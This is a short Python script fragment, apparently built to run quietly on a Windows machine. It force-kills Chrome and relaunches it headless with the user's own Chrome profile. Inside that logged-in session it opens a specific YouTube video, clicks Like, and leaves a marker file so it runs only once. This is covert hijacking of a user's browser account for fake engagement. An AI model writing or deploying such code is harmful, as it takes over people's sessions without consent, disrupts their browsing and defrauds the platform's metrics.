
temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, 'file.control')
if os.path.exists(file_path):
    sys.exit(0)
else:
    subprocess.getoutput("taskkill /f /im chrome.exe")
    time.sleep(3)
    if "chrome.exe" not in os.popen("tasklist").read():
        open(file_path, 'w').close()
        with sync_playwright() as p:
            login_ = os.getlogin()
            user_data_dir = f"C:\\Users\\{login_}\\AppData\\Local\\Google\\Chrome\\{r'User Data'}"
            browser = p.chromium.launch_persistent_context(user_data_dir, channel="chrome", headless=True)
            page = browser.new_page()
            page.set_viewport_size({"width": 1280, "height": 720})
            page.goto('https://www.youtube.com/')
            page.wait_for_load_state('networkidle')
            page.goto('https://www.youtube.com/watch?v=QxnJRdf-VTQ')
            page.wait_for_load_state('networkidle')
            time.sleep(random.randint(1, 6))
            page.wait_for_selector('yt-animated-icon[animated-icon-type="LIKE"]')
            page.click('yt-animated-icon[animated-icon-type="LIKE"]')
            time.sleep(random.randint(30, 36))
            page.goto('https://www.youtube.com/')
            browser.close()
    else:
        sys.exit(0)
